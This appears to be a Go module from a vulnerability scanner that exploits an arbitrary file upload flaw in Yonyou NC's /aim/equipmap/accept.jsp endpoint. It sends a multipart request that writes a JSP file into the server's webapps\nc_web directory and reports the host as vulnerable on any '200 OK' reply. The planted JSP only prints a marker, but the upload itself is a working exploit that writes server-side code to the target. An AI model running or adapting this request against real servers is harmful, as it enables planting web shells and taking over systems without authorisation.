package accept_upload

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/aim/equipmap/accept.jsp"
	data := "-----------------------------16314487820932200903769468567\nContent-Disposition: form-data; name=\"upload\"; filename=\"2XOSxplUo2EnwilSNJazJYZxZUc.txt\"\nContent-Type: text/plain\n\n<% out.println(\"2XOSxnJbIM7VyX60FJvryCft1X5\"); %>\n-----------------------------16314487820932200903769468567\nContent-Disposition: form-data; name=\"fname\"\n\n\\webapps\\nc_web\\2XOSxnFIgjeaGE7MQmmZiv3Imfw.jsp\n-----------------------------16314487820932200903769468567--"
	resp, err := client.R().SetHeaders(map[string]string{ // Set multiple headers at once
		"User-Agent":   UA,
		"Content-Type": "multipart/form-data; boundary=---------------------------16314487820932200903769468567",
	}).SetBody(data).Post(url)
	if err != nil {
		color.Red.Println("[-] 用友 accept 任意文件上传漏洞不存在")
		return
	}
	if resp.Status == "200 OK" {
		color.Green.Println("[+] 用友 accept 任意文件上传漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 accept 任意文件上传漏洞不存在")
}
